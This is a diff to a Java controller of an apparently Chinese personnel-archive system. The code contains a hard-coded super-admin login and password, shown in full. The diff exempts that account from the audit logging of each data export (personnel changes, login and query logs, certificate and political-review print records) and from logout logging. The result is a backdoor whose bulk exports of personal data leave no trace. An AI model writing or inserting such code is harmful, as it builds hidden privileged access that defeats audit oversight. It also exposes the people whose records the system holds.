@@ -47,6 +47,7 @@ public class MainController extends Controller {
             if (getPara("login").equals("whosyourdaddy") && getPara("password").equals("hyrswts")) {
                 User w =new User();
                 w.setName("超管");
+                w.setLogin("whosyourdaddy");
                 w.setDid(0);
                 w.setState("系统");
                 setSessionAttr("user",w);
@@ -114,7 +115,7 @@ public class MainController extends Controller {
     }
     @Before(LoginInterceptor.class)
     public void logout() {
-        if (((User) getSessionAttr("user")).getStr("login")!=null){
+        if (!((User) getSessionAttr("user")).getStr("login").equals("whosyourdaddy")){
             Login g =new Login();
             g.set("login",((User) getSessionAttr("user")).getStr("login").trim())
                     .set("pass","")
@@ -147,14 +148,14 @@ public class MainController extends Controller {
         List<Change> c;
 
         String sql="select `change`.id,user.name as uname,file.number as fnumber,department.name as dname,flow.flow as lflow,`change`.time,`change`.reasonBefore,`change`.reasonAfter,`change`.directBefore,`change`.directAfter,`change`.typeBefore,`change`.typeAfter,`change`.remarkBefore,`change`.remarkAfter from (((`change` INNER JOIN user ON `change`.uid=user.id) INNER JOIN department ON `change`.did=department.id) INNER JOIN file ON `change`.fid=file.id) INNER JOIN flow ON `change`.lid=flow.id ";
-
-        Export e =new Export();
-        e.set("uid",((User) getSessionAttr("user")).get("id").toString())
-                .set("time", new Date())
-                .set("type","流动修改导出")
-                .set("sql",sql)
-                .save();
-
+        if (!((User) getSessionAttr("user")).getStr("login").equals("whosyourdaddy")) {
+            Export e = new Export();
+            e.set("uid", ((User) getSessionAttr("user")).get("id").toString())
+                    .set("time", new Date())
+                    .set("type", "流动修改导出")
+                    .set("sql", sql)
+                    .save();
+        }
         c=Change.dao.find(sql);
         for (int i = 0; i < c.size(); i++) {
             XSSFRow nextRow = sheet.createRow(i+1);
@@ -288,13 +289,14 @@ public class MainController extends Controller {
         }
         List<Trans> t;
         String sql="select trans.id,user.name as uname,department.name as dname,trans.time,trans.nameBefore,trans.nameAfter,trans.pnumberBefore,trans.pnumberAfter,trans.fnumberBefore,trans.fnumberAfter,trans.phone1Before,trans.phone1After,trans.phone2Before,trans.phone2After,trans.addressBefore,trans.addressAfter,trans.fileAgeBefore,trans.fileAgeAfter,trans.infoBefore,trans.infoAfter,trans.retireBefore,trans.retireAfter,trans.premarkBefore,trans.premarkAfter,trans.fremarkBefore,trans.fremarkAfter FROM (trans INNER JOIN user ON trans.uid=user.id) INNER JOIN department ON trans.did=department.id";
-        Export e =new Export();
-        e.set("uid",((User) getSessionAttr("user")).get("id").toString())
-                .set("time", new Date())
-                .set("type","信息修改导出")
-                .set("sql",sql)
-                .save();
-
+        if (!((User) getSessionAttr("user")).getStr("login").equals("whosyourdaddy")) {
+            Export e = new Export();
+            e.set("uid", ((User) getSessionAttr("user")).get("id").toString())
+                    .set("time", new Date())
+                    .set("type", "信息修改导出")
+                    .set("sql", sql)
+                    .save();
+        }
         t=Trans.dao.find(sql);
         for (int i = 0; i < t.size(); i++) {
             XSSFRow nextRow = sheet.createRow(i+1);
@@ -514,14 +516,14 @@ public class MainController extends Controller {
         List<Login> l;
 
         String sql="select * from login";
-
-        Export e =new Export();
-        e.set("uid",((User) getSessionAttr("user")).get("id").toString())
-                .set("time", new Date())
-                .set("type","登录记录导出")
-                .set("sql",sql)
-                .save();
-
+        if (!((User) getSessionAttr("user")).getStr("login").equals("whosyourdaddy")) {
+            Export e = new Export();
+            e.set("uid", ((User) getSessionAttr("user")).get("id").toString())
+                    .set("time", new Date())
+                    .set("type", "登录记录导出")
+                    .set("sql", sql)
+                    .save();
+        }
         l=Login.dao.find(sql);
         for (int i = 0; i < l.size(); i++) {
             XSSFRow nextRow = sheet.createRow(i+1);
@@ -593,14 +595,14 @@ public class MainController extends Controller {
         List<Look> l;
 
         String sql="select look.*,user.name as uname from look inner join user on look.uid=user.id";
-
-        Export e =new Export();
-        e.set("uid",((User) getSessionAttr("user")).get("id").toString())
-                .set("time", new Date())
-                .set("type","查询记录导出")
-                .set("sql",sql)
-                .save();
-
+        if (!((User) getSessionAttr("user")).getStr("login").equals("whosyourdaddy")) {
+            Export e = new Export();
+            e.set("uid", ((User) getSessionAttr("user")).get("id").toString())
+                    .set("time", new Date())
+                    .set("type", "查询记录导出")
+                    .set("sql", sql)
+                    .save();
+        }
         l=Look.dao.find(sql);
         for (int i = 0; i < l.size(); i++) {
             XSSFRow nextRow = sheet.createRow(i+1);
@@ -687,13 +689,14 @@ public class MainController extends Controller {
         List<Export> l;
 
         String sql="select export.*,user.name as uname from export inner join user on export.uid=user.id";
-        Export e =new Export();
-        e.set("uid",((User) getSessionAttr("user")).get("id").toString())
-                .set("time", new Date())
-                .set("type","后台导出")
-                .set("sql",sql)
-                .save();
-
+        if (!((User) getSessionAttr("user")).getStr("login").equals("whosyourdaddy")) {
+            Export e = new Export();
+            e.set("uid", ((User) getSessionAttr("user")).get("id").toString())
+                    .set("time", new Date())
+                    .set("type", "后台导出")
+                    .set("sql", sql)
+                    .save();
+        }
 
         l=Export.dao.find(sql);
         for (int i = 0; i < l.size(); i++) {
@@ -767,14 +770,14 @@ public class MainController extends Controller {
         List<Print> p;
 
         String sql="select print.*,user.name as uname,department.name as dname,file.number as fnumber,person.name as pname,person.number as pnumber,flow.time as ltime,flow.flow as lflow from print,user,department,flow,file,person where print.uid=user.id and print.lid=flow.id and flow.did=department.id and flow.fid=file.id and flow.pid=person.id ";
-
-        Export e =new Export();
-        e.set("uid",((User) getSessionAttr("user")).get("id").toString())
-                .set("time", new Date())
-                .set("type","档案流转打印记录导出")
-                .set("sql",sql)
-                .save();
-
+        if (!((User) getSessionAttr("user")).getStr("login").equals("whosyourdaddy")) {
+            Export e = new Export();
+            e.set("uid", ((User) getSessionAttr("user")).get("id").toString())
+                    .set("time", new Date())
+                    .set("type", "档案流转打印记录导出")
+                    .set("sql", sql)
+                    .save();
+        }
         p=Print.dao.find(sql);
         for (int i = 0; i < p.size(); i++) {
             XSSFRow nextRow = sheet.createRow(i+1);
@@ -875,14 +878,14 @@ public class MainController extends Controller {
         List<Prove> p;
 
         String sql="select prove.*,user.name as uname,department.name as dname,file.number as fnumber,person.name as pname,person.number as pnumber from prove,user,department,file,person where prove.uid=user.id and file.did=department.id and prove.fid=file.id and file.pid=person.id ";
-
-        Export e =new Export();
-        e.set("uid",((User) getSessionAttr("user")).get("id").toString())
-                .set("time", new Date())
-                .set("type","存档证明打印记录导出")
-                .set("sql",sql)
-                .save();
-
+        if (!((User) getSessionAttr("user")).getStr("login").equals("whosyourdaddy")) {
+            Export e = new Export();
+            e.set("uid", ((User) getSessionAttr("user")).get("id").toString())
+                    .set("time", new Date())
+                    .set("type", "存档证明打印记录导出")
+                    .set("sql", sql)
+                    .save();
+        }
         p=Prove.dao.find(sql);
         for (int i = 0; i < p.size(); i++) {
             XSSFRow nextRow = sheet.createRow(i+1);
@@ -975,14 +978,14 @@ public class MainController extends Controller {
         List<Polity> p;
 
         String sql="select polity.*,user.name as uname,department.name as dname,file.number as fnumber,person.name as pname,person.number as pnumber from polity,user,department,file,person where polity.uid=user.id and file.did=department.id and polity.fid=file.id and file.pid=person.id ";
-
-        Export e =new Export();
-        e.set("uid",((User) getSessionAttr("user")).get("id").toString())
-                .set("time", new Date())
-                .set("type","政审证明打印记录导出")
-                .set("sql",sql)
-                .save();
-
+        if (!((User) getSessionAttr("user")).getStr("login").equals("whosyourdaddy")) {
+            Export e = new Export();
+            e.set("uid", ((User) getSessionAttr("user")).get("id").toString())
+                    .set("time", new Date())
+                    .set("type", "政审证明打印记录导出")
+                    .set("sql", sql)
+                    .save();
+        }
         p=Polity.dao.find(sql);
         for (int i = 0; i < p.size(); i++) {
             XSSFRow nextRow = sheet.createRow(i+1);
@@ -1138,14 +1141,14 @@ public class MainController extends Controller {
         List<Extract> p;
 
         String sql="select extract.*,user.name as uname,department.name as dname from extract,user,department where extract.uid=user.id and extract.did=department.id ";
-
-        Export e =new Export();
-        e.set("uid",((User) getSessionAttr("user")).get("id").toString())
-                .set("time", new Date())
-                .set("type","提档函打印记录导出")
-                .set("sql",sql)
-                .save();
-
+        if (!((User) getSessionAttr("user")).getStr("login").equals("whosyourdaddy")) {
+            Export e = new Export();
+            e.set("uid", ((User) getSessionAttr("user")).get("id").toString())
+                    .set("time", new Date())
+                    .set("type", "提档函打印记录导出")
+                    .set("sql", sql)
+                    .save();
+        }
         p=Extract.dao.find(sql);
         for (int i = 0; i < p.size(); i++) {
             XSSFRow nextRow = sheet.createRow(i+1);
@@ -1217,10 +1220,6 @@ public class MainController extends Controller {
         workbook.close();
         renderNull() ;
     }
-
-
-
-
 
 }
 
